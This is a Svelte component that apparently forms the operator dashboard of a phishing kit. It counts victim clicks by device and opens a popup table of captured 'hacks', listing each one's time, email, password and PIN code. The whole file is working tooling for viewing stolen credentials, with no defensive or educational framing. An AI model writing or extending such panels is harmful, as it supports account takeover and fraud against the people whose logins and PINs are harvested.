<script>
  import { getUser, updateCheckpoint } from "$lib/users";
  import { detailsShow } from "$lib/stores/states";

  import { clicksList, hacksList, user } from "$lib/stores/user-store";
  import HackData from "./HackData.svelte";

  $: hacks = $hacksList;
  $: mobileClicks=$clicksList.filter((c)=>c.device==='Mobile')
  $: desktopClicks=$clicksList.filter((c)=>c.device==='Desktp')
  async function showhackView() {
    console.log("hacks to show", hacks, $hacksList);
    $detailsShow = true;
    await updateCheckpoint($user.uid);
    $user = await getUser($user.uid);
    localStorage.setItem("user", JSON.stringify($user));
  }
  function hidehackView() {
    $detailsShow = false;
  }
</script>

<div class="summary-wrapper">
  <div class="clicks-wrapper">
    <div class="m-click-wrapper">
      <p class="p-style-title">Mobile Clicks</p>
      <p class="p-style-number">{mobileClicks.length}</p>
    </div>
    <div class="d-click-wrapper">
      <p class="p-style-title">Desktop Clicks</p>
      <p class="p-style-number">{desktopClicks.length}</p>
    </div>
  </div>
  <div class="acc-click-wrapper">
    <p class="p-style-acc-title">Accounts</p>
    <p class="p-style-acc-number">{$hacksList.length}</p>
    <!-- Button Component is detected here -->
    <button on:click={showhackView} class="button-view-acc">View</button>
  </div>
</div>

{#if $detailsShow}
  <div class="fixed-popup">
    <div class="table-wrapper">
      <div class="close-bar">
        <div class="cl-left"></div>
        <div class="cl-right" on:click={hidehackView}>🗙</div>
      </div>
      <table>
        <tr>
          <th>Time</th>

          <th>Email</th>
          <th>Password</th>
          <th>Pin-code</th>
          <!-- <th>UserAgent</th> -->
        </tr>
        {#each hacks as hack}
          <HackData {hack} />
        {/each}
      </table>
    </div>
  </div>
{/if}

<style>
  .summary-wrapper {
    box-sizing: border-box;
    display: flex;
    flex-direction: row;
    gap: 8px;
    align-items: center;
    justify-content: center;
    padding: 10px;
  }
  .clicks-wrapper {
    display: flex;
    flex-direction: column;
    align-items: stretch;
    justify-content: flex-start;
  }
  .m-click-wrapper {
    box-sizing: border-box;
    display: flex;
    flex: 0 0 auto;
    flex-direction: row;
    gap: 8px;
    align-items: center;
    justify-content: space-between;
    height: 46px;
    padding-right: 16px;
    padding-left: 16px;
    background: rgba(96, 43, 35, 1);
    border-radius: 4px;
    max-width: 180px;
  }
  .p-style-title {
    flex: 0 0 auto;
    padding: 0;
    margin: 0;
    font: 400 16px Inter;
    color: rgba(255, 255, 255, 1);
  }
  .p-style-number {
    flex: 0 0 auto;
    padding: 0;
    margin: 0;
    font: 400 18px Inter;
    color: rgba(255, 255, 255, 1);
  }
  .d-click-wrapper {
    box-sizing: border-box;
    display: flex;
    flex: 0 0 auto;
    flex-direction: row;
    gap: 8px;
    align-items: center;
    justify-content: space-between;
    height: 46px;
    padding-right: 16px;
    padding-left: 16px;
    margin-top: 14px;
    background: rgba(243, 77, 41, 1);
    border-radius: 4px;
    max-width: 180px;
  }
  .acc-click-wrapper {
    display: flex;
    flex: 0 0 auto;
    flex-direction: column;
    gap: 11px;
    align-items: center;
    justify-content: flex-start;
    padding: 7px 34px;
    background: rgba(243, 138, 41, 1);
    border-radius: 5px;
  }
  .p-style-acc-title {
    flex: 0 0 auto;
    align-self: stretch;
    padding: 0;
    margin: 0;
    font: 400 16px Inter;
    color: rgba(255, 255, 255, 1);
  }
  .p-style-acc-number {
    flex: 0 0 auto;
    padding: 0;
    padding-right: 23px;
    padding-left: 23px;
    margin: 0;
    font: 600 20px Inter;
    color: rgba(0, 0, 0, 1);
  }
  .button-view-acc {
    box-sizing: border-box;
    display: block;
    flex: 0 0 auto;
    width: 70px;
    min-width: 70px;
    height: 26px;
    font: 400 14px Inter;
    color: rgba(255, 255, 255, 1);
    cursor: pointer;
    background: rgba(29, 29, 29, 1);
    border: none;
    border-radius: 5px;
  }

  /* table styles */
  .close-bar {
    display: flex;
    justify-content: space-between;
  }
  .cl-right {
    padding: 10px 20px;
    cursor: pointer;
    color: red;
    font-size: 20px;
  }
  .fixed-popup {
    position: fixed;
    background-color: #284055;
    width: 100%;
    height: calc(100% - 36px);
    display: flex;
    justify-content: center;
    top: 36px;
    left: 0;
    overflow: auto;
    margin-top: 12px;
    z-index: 10;
  }

  .table-wrapper {
    border: 2px solid rgba(128, 128, 128, 0.384);
    background-color: rgb(255, 255, 255);
    border-radius: 8px;
    margin-top: 12px;
  }
  table {
    border-spacing: 8px;
    padding: 6px 12px;
  }
  th {
    text-align: start;
  }
</style>
